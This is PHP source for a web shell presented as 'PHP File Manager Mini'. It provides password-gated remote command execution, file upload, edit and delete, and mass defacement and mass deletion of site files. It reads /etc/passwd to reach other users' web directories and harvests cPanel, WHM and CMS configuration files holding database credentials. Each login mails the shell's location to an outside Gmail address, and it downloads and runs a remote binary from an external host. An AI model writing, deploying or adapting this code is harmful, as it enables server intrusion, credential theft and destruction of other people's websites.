<?php
define('SEP', '/');
session_start();
$password = '49f0bad299687c62334182178bfd75d8'; // default : sad
function logout()
{
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}
function login()
{
    ?>
	<style type="text/css">
		body {
			background:#1c1c1c;
		}
		input[type=password] {
			color:grey;
			text-align:center;
			background:transparent;
			border:1px solid grey;
		}
	</style>
	<form method="post">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
		<center>
		<input type="password" name="password" placeholder="Password">
	    </center>
	</form>
	<?php exit();
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (
        empty($password) ||
        (isset($_POST['password']) && md5($_POST['password']) == $password)
    ) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        $email = [
            'email' => 'xnonhack@gmail.com',
            'subject' => 'Logger',
            'message' =>
                'http://' .
                $_SERVER['SERVER_NAME'] .
                $_SERVER['SCRIPT_NAME'] .
                $password,
            'header' => 'From:L0LZ666H05T',
        ];
        @mail($email['email'], $email['subject'], $email['message']);
    } else {
        login();
    }
}
?>
<title>PHP File Manager Mini</title>
<style type="text/css">
	body {
		background:#1c1c1c;
		color:#fff;
		font-family: Arial;
	} textarea {
		color:#000;
		background:#fff;
		border:1px solid #fff;
		width:50%;
		height:300px;
	} input[type=submit] {
		color:#fff;
		border:1px solid green;
		background:green;
		font-weight:bold;
	} input[type=text] {
		background:#fff;
		color:#000;
		border:1px solid #fff;
	} table, tr, td {
		border:1px solid green;
		border-spacing:0;
		border-collapse:collapse;
	} a {
		color:#fff;
		text-decoration:none;
	} a:hover {
		color:red;
	} th {
		padding:5px;
		background:green;
	} a.folder {
		margin: 9px 0px 0px 0px 2px;
		background:green;
		padding:3px 7px;
		border-radius:3px; 
		font-size:10px;
	} a.folder:hover {
	    transition:0.3s;
	    transform:scale(1.1);
	    background:darkgreen;
	    color:grey;	
	} a.file {
		background:green;
		padding:3px 7px;
		border-radius:3px;
		font-size:10px;
	} a.file:hover {
		transition:0.3s;
		transform:scale(1.1);
		background:darkgreen;
		color:grey;
	} tr.hover:hover {
		background:darkgreen;
	} tr.first {
		background:green
	} td.first {
		border:none;
		padding:-5px;
	} tr.top {
		border:none;
	} .dropbtn {
        color: white;
        border: none;
        cursor: pointer;
    } .dropdown {
        position: relative;
        display: inline-block;
    } .dropdown-content {
        display: none;
        position: absolute;
        background-color: #f9f9f9;
        min-width: 160px;
        box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
        z-index: 1;
    } .dropdown-content a {
        color: black;
        padding: 12px 16px;
        text-decoration: none;
        display: block;
    } .dropdown-content a:hover {
    	background-color: #f1f1f1
    } .dropdown:hover .dropdown-content {
        display: block;
    } .dropdown:hover .dropbtn {
        background-color:;
    }
</style>
<?php
error_reporting(0);
function perms($file)
{
    $perms = fileperms($file);
    switch ($perms & 0xf000) {
        case 0xc000: // socket
            $info = 's';
            break;
        case 0xa000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = 'r';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default:
            // unknown
            $info = 'u';
    }
    // Owner
    $info .= $perms & 0x0100 ? 'r' : '-';
    $info .= $perms & 0x0080 ? 'w' : '-';
    $info .=
        $perms & 0x0040
            ? ($perms & 0x0800
                ? 's'
                : 'x')
            : ($perms & 0x0800
                ? 'S'
                : '-');
    // Group
    $info .= $perms & 0x0020 ? 'r' : '-';
    $info .= $perms & 0x0010 ? 'w' : '-';
    $info .=
        $perms & 0x0008
            ? ($perms & 0x0400
                ? 's'
                : 'x')
            : ($perms & 0x0400
                ? 'S'
                : '-');
    // World
    $info .= $perms & 0x0004 ? 'r' : '-';
    $info .= $perms & 0x0002 ? 'w' : '-';
    $info .=
        $perms & 0x0001
            ? ($perms & 0x0200
                ? 't'
                : 'x')
            : ($perms & 0x0200
                ? 'T'
                : '-');
    return $info;
}
function w($dir, $perm)
{
    if (!is_writable($dir)) {
        return "<font color=red>" . $perm . "</font>";
    } else {
        return "<font color=lime>" . $perm . "</font>";
    }
}
function exe($cmd)
{
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff .= $result;
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
}
function pwd()
{
    $dir = explode("/", curldir());
    foreach ($dir as $key => $index) {
        print "<a href='?dir=";
        for ($i = 0; $i <= $key; $i++) {
            print $dir[$i];
            if ($i != $key) {
                print "/";
            }
        }
        print "'>$index</a>/";
    }
}
?>
<table align="center" width="60%">
	<tr>
		<th colspan="4">PHP File Manager Mini</th>
	</tr>
	<tr class="top">
		<td class="first">
			Current Dir : <?php print @pwd(); ?> [ <?php print w(
     curldir(),
     perms(curldir())
 ); ?> ]
		</td>
		<td><center>
			<a href="?" style="color:lightblue;">Home</a>
		</td>
		<td><center>
			<a href="?dir=<?php print curldir(); ?>&action=config">Config</a>
		</td>
		<td><center>
			<a href="?dir=<?php print curldir(); ?>&action=multimass">Mass Deface</a>
		</td>
	</tr>
	<tr class="top">
		<td class="first">
			<?php print tools("upload"); ?>
		</td>
		<td>
			<center>
			<a href="?dir=<?php print curldir(); ?>&action=jumping">Jumping</a>
			</center>
		</td>
		<td><center>
			<a href="">Symlink</a>
		</center></td>
		<td><center>
			<a href="">Auto edit user</a>
		</center></td>
	<tr class="top">
		<td class="first">
			<?php print tools("makefile"); ?>
		</td>
		<td><center>
			<a href="?dir=<?php print @curldir(); ?>&action=adminer">Adminer</a>
		</center></td>
		<td><center>
			<a href="?dir=<?php print @curldir(); ?>&action=cmd">Command</a>
		</center></td>
		<td><center>
			<a href="?action=logout" style="color:red;">Logout</a>
		</center></td>
	</tr>
<?php
function tools($toolsname = null)
{
    if ($toolsname === 'makefile') {

        function make_dir($dir, $dirname)
        {
            if (@mkdir($dir . DIRECTORY_SEPARATOR . $dirname)) {
                print "<script>window.location='?dir=" .
                    $dir .
                    '/' .
                    $filename .
                    "';</script>";
            } else {
                print "Failed";
            }
        }
        function make_file($dir, $filename)
        {
            if (@touch($dir . DIRECTORY_SEPARATOR . $filename)) {
                print "<script>window.location='?action=edit&files=" .
                    $dir .
                    '/' .
                    $filename .
                    "';</script>";
            } else {
                print "Failed";
            }
        }
        if (isset($_POST['make'])) {
            if ($_POST['type'] == 'make_dir') {
                @make_dir(curldir(), $_POST['filename']);
            }
            if ($_POST['type'] == 'make_file') {
                @make_file(curldir(), $_POST['filename']);
            }
        }
        ?>
			<form method="post">
				<input style="width:190px;" type="text" name="filename">
				<input type="radio" name="type" value="make_dir" checked> dir
				<input type="radio" name="type" value="make_file"> file
				<input type="submit" name="make">
			</form>
		<?php
    }
    // MultiMass
    if ($toolsname === 'multimass') {

        function massdelete($dir, $filename)
        {
            print "<table align=center width=60%>";
            print "<tr><th>RESULT</th></tr>";
            if (is_writable($dir)) {
                $scandir = @scandir($dir);
                foreach ($scandir as $dirx) {
                    $files = $dir . DIRECTORY_SEPARATOR . $dirx;
                    $file = $dir . DIRECTORY_SEPARATOR . $filename;
                    $location = $files . DIRECTORY_SEPARATOR . $filename;
                    if ($files === '.') {
                        if (file_exists($file)) {
                            @unlink($file);
                        }
                    }
                    if ($files === '..') {
                        if (
                            file_exists(
                                dirname($dir) . DIRECTORY_SEPARATOR . $filename
                            )
                        ) {
                            @unlink(
                                dirname($dir) . DIRECTORY_SEPARATOR . $filename
                            );
                        }
                    } else {
                        if (is_dir($files)) {
                            if (is_writable($files)) {
                                if (file_exists($location)) {
                                    print "<tr><td>[ DELETED ] => " .
                                        $location .
                                        "</td></tr>";
                                    @unlink($location);
                                    massdelete($files, $filename);
                                }
                            }
                        }
                    }
                    die();
                }
            }
        }
        function massdeface($dir, $filename, $text)
        {
            print "<table align=center width=60%>";
            print "<tr><th>RESULT</th></tr>";
            if (is_writable($dir)) {
                $scandir = @scandir($dir);
                foreach ($scandir as $dirx) {
                    $web = $_SERVER['HTTP_HOST'];
                    $file = $dir . DIRECTORY_SEPARATOR . $dirx;
                    $location = $file . DIRECTORY_SEPARATOR . $filename;
                    if ($file === '.') {
                        @file_put_contents($location, $text);
                    }
                    if ($file === '..') {
                        @file_put_contents($location, $text);
                    } else {
                        if (is_dir($file)) {
                            if (is_writable($file)) {
                                print "<tr><td>[ DONE ] => " .
                                    $dir .
                                    DIRECTORY_SEPARATOR .
                                    $dirx .
                                    "</td>";
                                @file_put_contents($location, $text);
                            }
                        }
                    }
                }
            }
            die();
        }
        if (isset($_POST['start'])) {
            if ($_POST['type'] == 'massdeface') {
                @massdeface($_POST['dir'], $_POST['filename'], $_POST['text']);
            }
            if ($_POST['type'] == 'massdelete') {
                @massdelete($_POST['dir'], $_POST['filename']);
            }
        }
        ?>
	<form method="post">
		<table align="center" width="60%">
		<tr>
			<th colspan="2">Multimass</th>
		</tr>
		<tr>
			<td colspan="2"><center>
				<input type="radio" name="type" value="massdeface" checked>Massdeface
				<input type="radio" name="type" value="massdelete">Massdelete
			</center></td>
		</tr>
		<tr>
			<td colspan="2">
				<center><p>if you used <b>Massdelete</b> please empty the text</p></center>
			</td>
		</tr>
		<tr>
		<td colspan="2">
		 <input style="width:100%;" type="text" name="dir" value="<?php print getcwd(); ?>">
		</td>
	</tr>
	<tr>
		<td colspan="2">
		<input style="width:100%;" type="text" name="filename" value="index.php">
		</td>
	</tr>
	<tr>
		<td colspan="2">
		<textarea style="width:100%;height:250px;" name="text" placeholder="you text"></textarea>
		</td>
	</tr>
	<tr>
		<td colspan="2">
			<input style="width:100%;" type="submit" name="start">
		</td>
	</tr>
	</form>
</table>
<?php die();
    }
    // Upload
    if ($toolsname === 'upload') {

        if (isset($_POST['upload'])) {
            if ($_POST['type'] == 'biasa') {
                if (
                    @copy(
                        $_FILES['file']['tmp_name'],
                        curldir() . '/' . $_FILES['file']['name']
                    )
                ) {
                    print "Success";
                } else {
                    print "Failed";
                }
            }
        }
        if ($_POST['type'] == 'home_root') {
            $home = $_SERVER['DOCUMENT_ROOT'];
            if (
                @copy(
                    $_FILES['file']['tmp_name'],
                    $home . '/' . $_FILES['file']['name']
                )
            ) {
                print "Success";
            } else {
                print "Failed";
            }
        }
        ?>
			<form method="post" enctype="multipart/form-data">
				<input type="radio" name="type" value="biasa" checked>biasa 
				[ <?php print w(curldir(), "Writable"); ?> ]
				<input type="radio" name="type" value="home_root">home_root
				[ <?php print w($_SERVER['DOCUMENT_ROOT'], "Writable"); ?> ]<br>
				<input type="file" name="file">
				<input type="submit" name="upload">
			</form>
		<?php
    }
    if ($toolsname === 'jumping') {
        $i = 0;
        if (@preg_match("/hsphere/", @curldir())) {
            $urls = @explode("\r\n", $_POST['url']);
            if (isset($_POST['jump'])) {
                foreach ($urls as $url) {
                    $url = @str_replace(
                        @["http:", "www."],
                        "",
                        @strtolower($url)
                    );
                    $etc = "/etc/passwd";
                    $f = @fopen($etc, "r");
                    while ($gets = @fgets($f)) {
                        $pecah = @explode(":", $gets);
                        $user = $pecah[0];
                        $dir_user = "/hsphere/local/home/$user";
                        if (is_dir($dir_user) === true) {
                            $url_user = $dir_user . DIRECTORY_SEPARATOR . $url;
                            if (is_readable($url_user)) {
                                $i++;
                                $nb =
                                    "[ R ] <a href='?dir=" .
                                    $url_user .
                                    "'>" .
                                    $url_user .
                                    "</a>";
                                if (is_writable($url_user)) {
                                    $nb =
                                        "[ R ] <a href='?dir=" .
                                        $url_user .
                                        "'>" .
                                        $url_user .
                                        "</a>";
                                }
                            }
                            print "" . $nb . "<br>";
                        }
                    }
                }
            }
            if ($i == 0) {
            } else {
                print "Total " .
                    $i .
                    " room di " .
                    gethostbyname($_SERVER['HTTP_HOST']) .
                    "";
            }
        } else {
            print "<table align=center width=60%>
			      <tr><th>Jumping</th></tr>";
            print "<form method='post>'";
            print "<tr><td>List Domain : </td></tr>";
            print '<tr><td><textarea style="width:100%;" name="url">';
            $fp = @fopen("/hsphere/local/config/httpd/sites/sites.txt", "r");
            while ($getss = @fgets($fp)) {
                print $getss;
            }
            print "</textarea></td></tr>";
            print '<tr><td><input type="submit" style="width:100%;" value="Jumping" name="jump"></td></tr>';
            print "</form>";
        }
        if (preg_match("/vhosts|vhost/", @curldir())) {
            preg_match("/\/var\/www\/(.*?)\//", @curldir(), $vh);
            $urls = explode("\r\n", $_POST['url']);
            if (isset($_POST['jump'])) {
                echo "<pre>";
                foreach ($urls as $url) {
                    $url = str_replace("www.", "", $url);
                    $web_vh = "/var/www/" . $vh[1] . "/$url/httpdocs";
                    if (is_dir($web_vh) === true) {
                        if (is_readable($web_vh)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                            if (is_writable($web_vh)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                            }
                            echo $jrw . "<br>";
                        }
                    }
                }
                if ($i == 0) {
                } else {
                    echo "<br>Total ada " .
                        $i .
                        " Kamar di " .
                        gethostbyname($_SERVER['HTTP_HOST']) .
                        "";
                }
                echo "</pre>";
            } else {
                echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
                bing("ip:$ip");
                echo '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
            }
        } else {
            echo "<pre>";
            ($etc = fopen("/etc/passwd", "r")) or
                die("<center><font color=red>Can't read /etc/passwd</font>");
            while ($passwd = fgets($etc)) {
                if ($passwd == '' || !$etc) {
                    echo "<center><font color=red>Can't read /etc/passwd</font>";
                } else {
                    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                    foreach ($user_jumping[1] as $user_idx_jump) {
                        $user_jumping_dir = "/home/$user_idx_jump/public_html";
                        if (is_readable($user_jumping_dir)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                            if (is_writable($user_jumping_dir)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                            }
                            echo $jrw;
                            if (function_exists('posix_getpwuid')) {
                                $domain_jump = file_get_contents(
                                    "/etc/named.conf"
                                );
                                if ($domain_jump == '') {
                                    echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                                } else {
                                    preg_match_all(
                                        "#/var/named/(.*?).db#",
                                        $domain_jump,
                                        $domains_jump
                                    );
                                    foreach ($domains_jump[1] as $dj) {
                                        $user_jumping_url = posix_getpwuid(
                                            @fileowner("/etc/valiases/$dj")
                                        );
                                        $user_jumping_url =
                                            $user_jumping_url['name'];
                                        if (
                                            $user_jumping_url == $user_idx_jump
                                        ) {
                                            echo " => ( <u>$dj</u> )<br>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                echo "<br>";
                            }
                        }
                    }
                }
            }
            if ($i == 0) {
            } else {
                echo "<br>Total ada " .
                    $i .
                    " Kamar di " .
                    gethostbyname($_SERVER['HTTP_HOST']) .
                    "";
            }
            echo "</pre>";
        }
    }
    if ($toolsname === 'adminer') {
        $full = @str_replace($_SERVER['DOCUMENT_ROOT'], "", @curldir());
        function adminer($full, $text)
        {
            $fp = @fopen($text, "w");
            $ch = @curl_init();
            @curl_setopt($ch, @CURLOPT_URL, $url);
            @curl_setopt($ch, @CURLOPT_BINARYTRANSFER, true);
            @curl_setopt($ch, @CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, @CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, @CURLOPT_FILE, $fp);
            return @curl_exec($ch);
            @curl_close($ch);
            @fclose($fp);
            @ob_flush();
            @flush();
        }
        if (@file_exists("adminer.php")) {
            print "<a href='" .
                $full .
                DIRECTORY_SEPARATOR .
                "adminer.php'>Adminer Login</a>";
        } else {
            if (
                @adminer(
                    "https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php",
                    "adminer.php"
                )
            ) {
                print "<a href='" .
                    $full .
                    DIRECTORY_SEPARATOR .
                    "adminer' target='_blank'>Adminer Login</a>";
            } else {
                print "Failed creat adminer";
            }
        }
    }
    if ($toolsname === 'config') {
        if (!file_exists('.config')) {
            @mkdir('.config');
        }
        if (!file_exists('.config/config')) {
            @mkdir('.config/config');
        }
        if (!file_exists('.config/config/.htaccess')) {
            $isi =
                "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
            file_put_contents('.config/config/.htaccess', $isi);
        }
        if (@preg_match("/vhosts|vhost/", $dir)) {
            $link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
            if (!file_exists('.config/config/vhost.cin')) {
                @file_put_contents(
                    '.config/config/vhost.cin',
                    @gzinflate(
                        @urldecode(
                            @file_get_contents(
                                'https://cvar1984.github.io/vhost.cin'
                            )
                        )
                    )
                );
                @chmod('.config/config/vhost.cin', 777);
            }
            if (exe("cd .config/config && ./vhost.cin")) {
                echo "<center><a href='$link_config/.config/config'><font color=lime>Done</font></a></center>";
            } else {
                print "<center><a href='$link_config/.config/config/vhost.cin'><font color=lime>Done</font></a></center>";
            }
        } else {
            ($etc = @fopen("/etc/passwd", "r")) or
                die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
            while ($passwd = fgets($etc)) {
                if ($passwd == "" || !$etc) {
                    echo "<font color=red>Can't read /etc/passwd</font>";
                } else {
                    preg_match_all('/(.*?):x:/', $passwd, $user_config);
                    if (file_exists('/home/')) {
                        $home = 'home';
                    } elseif (file_exists('/home1/')) {
                        $home = 'home1';
                    } elseif (file_exists('/home2/')) {
                        $home = 'home2';
                    } elseif (file_exists('/home3/')) {
                        $home = 'home3';
                    } elseif (file_exists('/home4/')) {
                        $home = 'home4';
                    }
                    foreach ($user_config[1] as $user_idx) {
                        $user_config_dir = "/$home/$user_idx/public_html";
                        if (is_readable($user_config_dir)) {
                            $grab_config = [
                                "/$home/$user_idx/.my.cnf" => "cpanel",
                                "/$home/$user_idx/.accesshash" => "WHM-accesshash",
                                "$user_config_dir/po-content/config.php" => "Popoji",
                                "$user_config_dir/vdo_config.php" => "Voodoo",
                                "$user_config_dir/bw-configs/config.ini" => "BosWeb",
                                "$user_config_dir/config/koneksi.php" => "Lokomedia",
                                "$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
                                "$user_config_dir/koneksi.php" => "Lokomedia",
                                "$user_config_dir/clientarea/configuration.php" => "WHMCS",
                                "$user_config_dir/whm/configuration.php" => "WHMCS",
                                "$user_config_dir/whmcs/configuration.php" => "WHMCS",
                                "$user_config_dir/forum/config.php" => "phpBB",
                                "$user_config_dir/sites/default/settings.php" => "Drupal",
                                "$user_config_dir/config/settings.inc.php" => "PrestaShop",
                                "$user_config_dir/app/etc/local.xml" => "Magento",
                                "$user_config_dir/joomla/configuration.php" => "Joomla",
                                "$user_config_dir/configuration.php" => "Joomla",
                                "$user_config_dir/wp/wp-config.php" => "WordPress",
                                "$user_config_dir/wordpress/wp-config.php" => "WordPress",
                                "$user_config_dir/wp-config.php" => "WordPress",
                                "$user_config_dir/admin/config.php" => "OpenCart",
                                "$user_config_dir/slconfig.php" => "Sitelok",
                                "$user_config_dir/application/config/database.php" => "Ellislab",
                                "$user_config_dir/config/database.php" => "Ellislab",
                                "$user_config_dir/models/db-settings.php" => "Usercake",
                                "$user_config_dir/config/database.php" => "Laravel",
                                "$user_config_dir/database.php" => "Laravel",
                                "$user_config_dir/application/config.ini" => "Zend",
                                "$user_config_dir/config/app.php" => "CakePHP",
                                "$user_config_dir/phalcon/config/adapter/ini.zep" => "Phalcon",
                                "$user_config_dir/config/adapter/ini.zep" => "Phalcon",
                                "$user_config_dir/app/config/configuration.yml" => "Symphony",
                                "$user_config_dir/app/config/databases.yml" => "Symphony",
                                "$user_config_dir/config/configuration.yml" => "Symphony",
                                "$user_config_dir/config/databases.yml" => "Symphony",
                                "$user_config_dir/config/db.php" => "FuelPHP & Yii2",
                                "$user_config_dir/src/settings.php" => "Slim",
                            ];
                            foreach ($grab_config as $config => $nama_config) {
                                $ambil_config = @file_get_contents($config);
                                if (!empty($ambil_config)) {
                                    $file_config = fopen(
                                        ".config/config/$user_idx-$nama_config.txt",
                                        "w"
                                    );
                                    fputs($file_config, $ambil_config);
                                    fclose($file_config);
                                }
                            }
                        }
                    }
                }
            }
            echo "<center><a href='?dir=" .
                curldir() .
                DIRECTORY_SEPARATOR .
                $dir .
                "/.config/config'>Done</a></center>";
        }
        die();
    }
}
function curldir()
{
    if (isset($_GET['dir'])) {
        $dir = str_replace("\\", "/", $_GET['dir']);
        @chdir($dir);
    } else {
        $dir = str_replace("\\", "/", getcwd());
    }
    return $dir;
}
function scdir()
{
    $dir = @scandir(curldir());
    return $dir;
}
function edit($dir)
{
    if (isset($_POST['edit'])) {
        if (@file_put_contents($dir, $_POST['edit'])) {
            $nb = "Success";
        } else {
            $nb = "Failed";
        }
    }
    $text = @htmlspecialchars(@file_get_contents($dir));
    ?>
	    <table align="center" width="60%">
	    <tr><th colspan="5">FILE EDITOR</th></tr>
	    <tr>
		<td>Filename :</td> <td ><?php print $dir; ?></td><td colspan="3"><center><?php print $nb; ?></td>
		<tr>
		<td>File Size :</td> <td colspan="4"><?php print size($dir); ?></td>
		<tr>
		<td>MIME-type :</td> <td colspan="4"><?php print type($dir); ?></td>
		<tr>
		<tr>
		<td>Permission : </td> <td colspan="4"><?php print w($dir, perms($dir)); ?></td>
		<tr>
		<td><center>
			<a href="?action=edit&url=<?php print curldir(); ?>&files=<?php print $dir; ?>"> 
			<font color="lime"><b>Edit</b></font> </a></center></td>
		<td><center>
			<a href='?action=renames&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Rename </a></center></td>
		<td><center>
			<a href="?action=chmods&url=<?php print curldir(); ?>&files=<?php print $dir; ?>"> Chmod </a></center></td>
		<td><center>
			<a href='?action=delete&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Delete </a></center></td>
		<td><center>
			<a href='?action=download&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Download </a></center></td>
		<form method="post">
			<tr>
			<td colspan="5">
			<textarea style="width:100%;" name="edit"><?php print $text; ?></textarea></td>
			<tr>
			<td colspan="5"><input style="width:100%;" type="submit"></td>
		</form>
	</center>
	<?php die();
}
function delete($dir)
{
    if (@is_dir($dir)) {
        $scandir = @scandir($dir);
        foreach ($scandir as $object) {
            if ($object != '.' && $object != '..') {
                if (@is_dir($dir . DIRECTORY_SEPARATOR . $object)) {
                    @delete($dir . DIRECTORY_SEPARATOR . $object);
                } else {
                    @unlink($dir . DIRECTORY_SEPARATOR . $object);
                }
            }
        }
        if (@rmdir($dir)) {
            print "<script>window.location='?dir=" . curldir() . "';</script>";
        } else {
            return false;
        }
    } else {
        if (@unlink($dir)) {
            print "<script>window.location='?dir=" . curldir() . "';</script>";
        } else {
            return false;
        }
    }
}
function renames($dir)
{
    if (isset($_POST['name'])) {
        if (@file_exists($dir)) {
            if (@rename($dir, $_POST['name'])) {
                $nb =
                    "<script>window.location='?action=renames&dir=" .
                    curldir() .
                    "&files=" .
                    $_POST['name'] .
                    "';</script>";
            } else {
                $nb = "Failed";
            }
        }
    } ?>
	<table align="center" width="60%">
	    <tr><th colspan="5">RENAME</th></tr>
	    <tr>
		<td>Filename : </td> <td><?php print $dir; ?></td><td colspan="3"><center><?php print $nb; ?></td>
		<tr>
		<td>File Size : </td> <td colspan="4"><?php print size($dir); ?></td>
		<tr>
		<td>MIME-type : </td> <td colspan="4"><?php print type($dir); ?></td>
		<tr>
		<tr>
		<td>Permission : </td> <td colspan="4"><?php print w($dir, perms($dir)); ?></td>
		<tr>
		<td><center>
			<a href="?action=edit&url=<?php print curldir(); ?>&files=<?php print $dir; ?>"> Edit </a></center></td>
		<td><center>
			<a href='?action=renames&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> 
		<font color="lime"><b>Rename</b></font> </a></center></td>
		<td><center>
			<a href="?action=chmods&url=<?php print curldir(); ?>&files=<?php print $dir; ?>"> Chmod </a></center></td>
		<td><center>
			<a href='?action=delete&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Delete </a></center></td>
		<td><center>
			<a href='?action=download&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Download </a></center></td>
		<form method="post">
			<tr><td colspan="4">
			<input style="width:100%;" type="text" name="name" value="<?php print $dir; ?>"></td>
			<td><input style="width:100%;" type="submit"></td>
		</form>
	</center>
	<?php die();
}
function chmods($dir)
{
    if (@file_exists($dir)) {
        if (isset($_POST['chmods'])) {
            if (@chmod($dir, $_POST['chmods'])) {
                $nb = "Success";
            } else {
                $nb = "Failed";
            }
        }
    }
    $mode = @substr(@sprintf('%o', @fileperms($dir)), -4);
    ?>
	<table align="center" width="60%">
	    <tr><th colspan="5">CHMOD</th></tr>
	    <tr>
		<td>Filename : </td> <td ><?php print $dir; ?></td><td colspan="3"><center><?php print $nb; ?></td>
		<tr>
		<td>File Size : </td> <td colspan="4"><?php print size($dir); ?></td>
		<tr>
		<td>MIME-type : </td> <td colspan="4"><?php print type($dir); ?></td>
		<tr>
		<tr>
		<td>Permission : </td> <td colspan="4"><?php print w($dir, perms($dir)); ?></td>
		<tr>
		<td><center>
			<a href="?action=edit&url=<?php print curldir(); ?>&files=<?php print $dir; ?>"> Edit </a></center></td>
		<td><center>
			<a href='?action=renames&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Rename </a></center></td>
		<td><center>
			<a href="?action=chmods&url=<?php print curldir(); ?>&files=<?php print $dir; ?>">
		<font color="lime"> <b>Chmod</b></font> </a></center></td>
		<td><center>
			<a href='?action=delete&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Delete </a></center></td>
		<td><center>
			<a href='?action=download&url=<?php print curldir(); ?>&files=<?php print $dir; ?>'> Download </a></center></td>
		<form method="post">
			<tr><td colspan="4">
				<center>
				<input style="width:100%;" type="text" name="chmods" value="<?php print $mode; ?>">
			</center>
			</td>
			<td>
				<input style="width:100%;" type="submit">
			</td>
		</form>
	</center>
	<?php die();
}
function download($dir)
{
    @ob_clean();
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header(
        'Content-Disposition: attachment; filename="' . basename($dir) . '"'
    );
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($dir));
    readfile($dir);
    exit();
}
function Size($file)
{
    $size = filesize($file) / 1024;
    $size = round($size, 3);
    if ($size >= 1024) {
        $size = round($size / 1024, 2) . ' MB';
    } else {
        $size = $size . ' KB';
    }
    return $size;
}
function view($filename)
{
    $text = @htmlspecialchars(@file_get_contents($filename)); ?>
  <table align="center" width="60%">
  	<tr>
  		<td>
  			<textarea style="width:100%;" readonly><pre><?php print $text; ?></pre></textarea>
  		</td>
  	</tr>
  </table>
  <?php exit();
}
function type($filename)
{
    if (@function_exists('finfo_open')) {
        $finfo = @finfo_open(FILEINFO_MIME_TYPE);
        $mime = @finfo_file($finfo, $filename);
        @finfo_close($finfo);
        return $mime;
    } elseif (@file_exists('mime_content_type')) {
        return @mime_content_type($filename);
    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
        $file = escapeshellarg($filename);
        $mime = shell_exec('file -bi' . $file);
        return $mime;
    } else {
        return "--";
    }
}
if (@$_GET['action'] == 'edit' and isset($_GET['files'])) {
    @edit($_GET['files']);
} elseif (@$_GET['action'] == 'delete' and isset($_GET['files'])) {
    @delete($_GET['files']);
} elseif (@$_GET['action'] == 'renames' and isset($_GET['files'])) {
    @renames($_GET['files']);
} elseif (@$_GET['action'] == 'download' and isset($_GET['files'])) {
    @download($_GET['files']);
} elseif (@$_GET['action'] == 'multimass') {
    @tools("multimass");
} elseif (@$_GET['action'] == 'chmods' and isset($_GET['files'])) {
    @chmods($_GET['files']);
} elseif (@$_GET['action'] == 'view' and isset($_GET['files'])) {
    @view($_GET['files']);
} elseif (@$_GET['action'] == 'jumping') {
    @tools("jumping");
} elseif (@$_GET['action'] == 'adminer') {
    @tools("adminer");
} elseif (@$_GET['action'] == 'config') {
    @tools("config");
} elseif (@$_GET['action'] == 'logout') {
    @logout();
} elseif (@$_GET['action'] == 'cmd') { ?>
	<table align="center" width="60%">
		<tr>
			<th colspan="2">Command</th>
		</tr>
	<form method='post'>
	<td><input type='text' style="width:100%;" name='cmd'></td>
	<td><input type='submit' style="width:100%;" name='do_cmd'></td><tr>
	</form>
	<?php
 if ($_POST['do_cmd']) {
     echo "<td colspan='2'><pre>" . exe($_POST['cmd']) . "</pre></td>";
 }
 die();
 }
function filemanager()
{
    print "<table align='center' width='60%'>";
    print "<tr><th>Filename</th>";
    print "<th>Type</th>";
    print "<th>Size</th>";
    print "<th>Permission</th>";
    print "</tr>";
    foreach (scdir() as $folder) {
        if (!is_dir(curldir() . DIRECTORY_SEPARATOR . $folder)) {
            continue;
        }
        if ($folder === '.' || $folder === '..') {
            continue;
        }
        $tool =
            "
			<a href='?action=renames&dir=" .
            curldir() .
            "&files=" .
            $folder .
            "'>Rename</a>
